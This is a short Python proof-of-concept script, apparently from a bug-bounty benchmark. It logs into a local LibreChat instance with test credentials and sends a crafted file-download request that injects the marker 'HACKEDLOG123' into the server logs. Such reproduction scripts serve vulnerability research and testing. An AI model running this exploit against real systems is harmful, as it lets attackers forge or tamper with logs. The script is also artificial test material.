import requests
import sys
import json

# used bounty 0 setup as a reference
IS_CI_RUN = sys.argv[1] if len(sys.argv) > 1 else False
if IS_CI_RUN:
    BASE_URL = "http://librechat:3080"
    HOST = "librechat:3080"
else:
    BASE_URL = "http://localhost:3080"
    HOST = "localhost:3080"

UPLOAD_URL = BASE_URL + "/api/files/images"
FILE_URL = BASE_URL + "/api/files"
LOGIN_URL = BASE_URL + "/api/auth/login"

def login():
    data = {
        "email": "email@email.com",
        "password": "test@123"
    }
    login_url = f"{BASE_URL}/api/auth/login"

    try:
        res = requests.post(login_url, json=data)
        response_data = json.loads(res.text)
        if "token" not in response_data:\
            sys.exit(1)
        return response_data["token"]
    except Exception as e:
        print(f"Login error: {str(e)}")
        sys.exit(1)

def inject_logs(token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/c/new",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Host": HOST
    }

    injection = "HACKEDLOG123"

    try:
        url = f"{BASE_URL}/api/files/download/{injection}/test"
        print(f"Sending request to: {url}")
        res = requests.get(url, headers=headers)
        print(f"Response status: {res.status_code}")
        print(f"Response body: {res.text}")
        return True
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

if __name__ == "__main__":
    try:
        token = login()
        if inject_logs(token):
            print("Log injection completed")
            sys.exit(0)
        else:
            print("Log injection failed")
            sys.exit(1)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)